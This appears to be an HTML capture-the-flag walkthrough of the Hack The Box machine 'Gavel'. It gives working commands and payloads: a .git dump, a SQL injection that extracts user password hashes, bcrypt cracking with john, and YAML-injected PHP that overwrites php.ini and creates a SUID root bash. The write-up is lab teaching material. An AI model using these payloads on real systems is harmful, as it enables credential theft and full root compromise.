@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Gavel - Walkthrough</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-info { background-color: #17a2b8; }
+        .tag-failure { background-color: #dc3545; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', monospace; margin: 20px 0; }
+        code { font-family: 'Consolas', monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+<div class="container">
+
+<h1>HTB Gavel – Walkthrough</h1>
+
+<div class="section">
+    <p>
+        Gavel is a Linux-based Medium difficulty machine. The attack chain relies on a publicly exposed source
+        code repository, a bypassable PDO-based SQL query, and an application-level YAML injection leading to
+        privilege escalation. A critical background factor is a CRON job configured to run every three minutes,
+        periodically resetting multiple database tables. Because of this behavior, timing and determinism were
+        essential throughout the exploitation process. All steps described below follow reproducible,
+        deterministic techniques rather than race-condition abuse.
+    </p>
+</div>
+
+<div class="section">
+    <h2>1. Reconnaissance</h2>
+    <span class="tag tag-info">INFORMATION</span>
+
+    <p>
+        I started with a minimal Nmap scan, as the host responded quickly and exposed only a small attack surface.
+    </p>
+
+    <pre><code>nmap -p22,80 -sC -sV gavel.htb</code></pre>
+
+    <pre><code>
+22/tcp open  ssh     OpenSSH 8.9p1
+80/tcp open  http    Apache 2.4.52
+    </code></pre>
+
+    <p>
+        During manual inspection of the web application, I noticed that the <code>.git</code> directory was
+        publicly accessible. This allowed me to retrieve the entire Git repository. Exposed Git metadata is a
+        recurring real-world issue and frequently leads to source code disclosure without requiring any
+        exploitation.
+    </p>
+
+    <pre><code>wget -r http://gavel.htb/.git/
+cd gavel.htb
+git log --all</code></pre>
+</div>
+
+<div class="section">
+    <h2>2. SQL Injection – User-Level Access</h2>
+    <span class="tag tag-success">SUCCESS</span>
+
+    <p>
+        While reviewing the recovered source code, I identified a PDO-based SQL query in
+        <code>inventory.php</code> that dynamically constructed column identifiers. Although prepared
+        statements were used for values, this unsafe handling of identifiers allowed the query structure
+        itself to be manipulated.
+    </p>
+
+    <p>
+        The objective was to concatenate the contents of the <code>users</code> table into a single field.
+        After several iterations, the following payload successfully bypassed the query constraints:
+    </p>
+
+    <pre><code>GET /inventory.php?user_id=x` FROM (
+SELECT group_concat(username,0x3a,password) AS `'x`
+FROM users)y;-- -&sort=\?;-- -%00</code></pre>
+
+    <p>The injection returned the following credential:</p>
+
+    <pre><code>auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RT**</code></pre>
+
+    <p>
+        The hash was cracked using a dictionary-based attack. Online hash databases were ineffective, so a
+        local cracking approach was required:
+    </p>
+
+    <pre><code>john --format=bcrypt --wordlist=rockyou.txt hash.txt</code></pre>
+
+    <pre><code>Password found: midnight**</code></pre>
+
+    <p>
+        With valid credentials obtained, I switched to the <code>auctioneer</code> user and retrieved the
+        user flag:
+    </p>
+
+    <pre><code>printf "midnight**\n" | su auctioneer -c "cat /home/auctioneer/user.txt"</code></pre>
+
+    <pre><code>f5c8fd6ced1386202c9c39785f5****</code></pre>
+</div>
+
+<div class="section">
+    <h2>3. Failed Paths and Dead Ends</h2>
+    <span class="tag tag-failure">DEAD END</span>
+
+    <p>
+        Several conventional privilege escalation techniques were attempted after obtaining user-level access.
+        These included reverse shells, direct privilege escalation attempts, and CRON manipulation. However,
+        the frequent database resets caused by the scheduled CRON job, combined with permission restrictions,
+        rendered these approaches ineffective.
+    </p>
+
+    <p>
+        This strongly indicated that root access was only achievable through application-level logic flaws,
+        rather than operating system misconfigurations.
+    </p>
+</div>
+
+<div class="section">
+    <h2>4. Privilege Escalation – YAML Injection</h2>
+    <span class="tag tag-success">SUCCESS</span>
+
+    <p>
+        The system included a helper utility called <code>gavel-util</code> designed to process YAML files.
+        The input validation was insufficient, allowing embedded PHP code execution within YAML fields.
+    </p>
+
+    <p>
+        As a first step, I created a YAML configuration file that modified the PHP runtime configuration by
+        overwriting the <code>php.ini</code> file:
+    </p>
+
+    <pre><code>cat > fix_ini.yaml << EOF
+name: fixini
+description: fix php ini
+image: x.png
+price: 1
+rule_msg: fixini
+rule: file_put_contents("/opt/gavel/.config/php/php.ini",
+"engine=On\ndisable_functions=\nopen_basedir=\n"); return false;
+EOF
+
+/usr/local/bin/gavel-util submit fix_ini.yaml</code></pre>
+
+    <p>
+        After restoring PHP functionality, a second YAML payload was used to create a SUID-enabled Bash binary.
+        Several publicly documented approaches failed in this environment. After further analysis and
+        controlled experimentation, the following payload proved reliable:
+    </p>
+
+    <pre><code>cat > rootshell.yaml << EOF
+name: rootshell
+description: suid bash
+image: x.png
+price: 1
+rule_msg: rootshell
+rule: system("cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash"); return false;
+EOF
+
+/usr/local/bin/gavel-util submit rootshell.yaml</code></pre>
+
+    <p>
+        Using the SUID Bash binary, full root access was obtained and the root flag retrieved:
+    </p>
+
+    <pre><code>/opt/gavel/rootbash -p -c "cat /root/root.txt"</code></pre>
+
+    <pre><code>1db2339ec8fac3ca4bc0eb7386b****</code></pre>
+</div>
+
+<div class="footer">
+    <p>HTB Gavel Walkthrough | 2025.dec.26</p>
+</div>
+
+</div>
+</body>
+</html>
